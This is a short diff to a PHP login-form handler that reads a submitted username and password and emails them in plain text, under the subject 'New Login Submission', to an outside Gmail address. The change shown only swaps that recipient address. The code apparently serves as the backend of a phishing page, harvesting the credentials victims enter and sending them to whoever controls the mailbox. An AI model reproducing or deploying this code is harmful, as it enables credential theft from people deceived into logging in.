@@ -4,7 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    $to = 'abed@gmail.com';
+    $to = 'abed.3bbad@gmail.com';
     $subject = 'New Login Submission';
     $message = "Email: $email\nUsername: $username\nPassword: $password";
     $headers = 'From: noreply@example.com' . "\r\n" .
